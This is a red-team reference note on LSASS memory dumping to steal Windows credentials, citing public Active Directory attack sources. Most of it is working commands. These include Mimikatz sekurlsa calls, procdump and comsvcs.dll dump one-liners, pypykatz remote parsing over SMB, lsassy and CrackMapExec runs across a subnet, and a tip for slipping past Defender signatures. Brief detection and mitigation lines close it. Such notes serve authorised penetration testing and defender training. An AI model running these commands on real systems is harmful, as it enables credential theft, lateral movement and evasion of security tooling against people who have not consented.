---
title: LSASS Dumping
aliases: ["LSASS dump", "sekurlsa", "Dump lsass"]
type: technique
domain: [red-team]
attack_tactic: [credential-access]
tags: [type/technique, domain/red-team, attack/credential-access]
source: ["[[Source - zer1t0 - Attacking Active Directory]]", "[[Source - hackndo blog]]"]
source_url: "https://zer1t0.gitlab.io/posts/attacking_ad/"
verified: true
related: ["[[LSASS]]", "[[Credential Storage in Windows]]", "[[Pass-the-Hash]]", "[[Overpass-the-Hash]]", "[[Pass-the-Ticket]]", "[[Privileges and Rights]]"]
created: 2026-06-06
updated: 2026-06-07
---

# LSASS Dumping

> [!summary] One-liner
> Read or dump LSASS process memory to harvest cached NT hashes, Kerberos keys/tickets, and any plaintext passwords.

## Concept abused
[[LSASS]] caches logged-on users' credentials in memory for SSO.

## Prerequisites
- **`SeDebugPrivilege`** (admin) enabled in the calling process. Blocked/limited by **Credential Guard** and **PPL** on lsass.

## Commands & tools

### [[Mimikatz]] (on target)
```
privilege::debug
sekurlsa::logonpasswords     :: NT hashes + plaintext (if cached)
sekurlsa::ekeys              :: Kerberos keys (AES/RC4)
sekurlsa::tickets            :: Kerberos tickets (-> Pass-the-Ticket)
```

### Dump memory, parse offline (OPSEC-friendlier)
```cmd
:: living-off-the-land memory dumps
procdump.exe -accepteula -ma lsass.exe lsass.dmp
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_PID> lsass.dmp full
```
Parse the dump with **pypykatz** / **mimikatz** (`sekurlsa::minidump lsass.dmp`).

#### comsvcs.dll MiniDump method
`C:\Windows\System32\comsvcs.dll` exports a `MiniDump` function that wraps `MiniDumpWriteDump`. Present on every Windows install -- no upload needed. Requires **SYSTEM** privileges (not just admin).
```cmd
:: get lsass PID first
tasklist /FI "IMAGENAME eq lsass.exe"

:: dump via comsvcs.dll (must run as SYSTEM)
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass_pid> lsass.dmp full
```

#### Procdump evasion tip
Using the PID instead of the process name avoids some Defender signature detections:
```cmd
:: detected -- uses process name
procdump.exe -accepteula -ma lsass.exe lsass.dmp

:: less detected -- uses PID
procdump -accepteula -ma <PID> lsass.dmp
```

### pypykatz (cross-platform offline parsing)
Python implementation of Mimikatz credential extraction logic. Runs on Linux/macOS/Windows -- no need for a Windows box to parse the dump.
```bash
# parse a local dump file
pypykatz lsa minidump lsass.dmp

# parse a dump remotely over SMB (no download needed)
pypykatz lsa minidump domain/user:pass@host:/C$/Windows/Temp/lsass.dmp
```

### lsassy (automated remote dump + extract)
Automates the full workflow: dump LSASS remotely, parse credentials, clean up. Install from PyPI (`pip install lsassy`). Integrates with **CrackMapExec** as a module.
```bash
# standalone
lsassy -d contoso.local -u Administrator -p 'Passw0rd!' 192.168.100.10

# via CrackMapExec module
crackmapexec smb 192.168.100.0/24 -u Administrator -p 'Passw0rd!' -M lsassy
```

### Remote dump + parse workflow (performance note)
Downloading a full LSASS dump can be 150 MB+. Tools like **lsassy** and **pypykatz** can read the dump remotely over SMB, parsing only the needed memory offsets. Key optimization: buffering reads in 4096-byte chunks instead of individual 4-byte reads reduces parse time from ~40 seconds to under 1 second.

## Detection / artifacts
- Process opening a **handle to lsass.exe** (Sysmon **EID 10**), `procdump`/`comsvcs` patterns, EDR/Defender signatures.

## Mitigation
- **Credential Guard**, **RunAsPPL** for lsass, attack-surface-reduction rules, least privilege (no local admin).

## Related
- Output feeds [[Pass-the-Hash]], [[Overpass-the-Hash]], [[Pass-the-Ticket]]. See store map: [[Credential Storage in Windows]].

## Sources
- [[Source - zer1t0 - Attacking Active Directory]] — "LSASS credentials"
- [[Source - hackndo blog]] — "Remote LSASS dump & credential extraction" (https://en.hackndo.com/remote-lsass-dump-passwords/)
